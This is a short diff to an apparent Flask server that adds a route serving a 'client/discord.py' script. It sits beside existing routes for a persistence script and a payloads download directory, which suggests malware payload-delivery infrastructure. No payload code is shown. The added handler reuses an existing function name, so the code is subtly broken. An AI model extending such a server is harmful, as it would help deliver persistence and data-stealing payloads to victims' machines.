@@ -51,6 +51,10 @@ def client_data():
 def persistence():
     return render_template("client/persistence.py")
 
+@app.route('/discord.py')
+def persistence():
+    return render_template("client/discord.py")
+
 @app.route('/get_payloads/<path:filename>')
 def get_payloads(filename):
     return send_from_directory('payloads', filename, as_attachment=True)
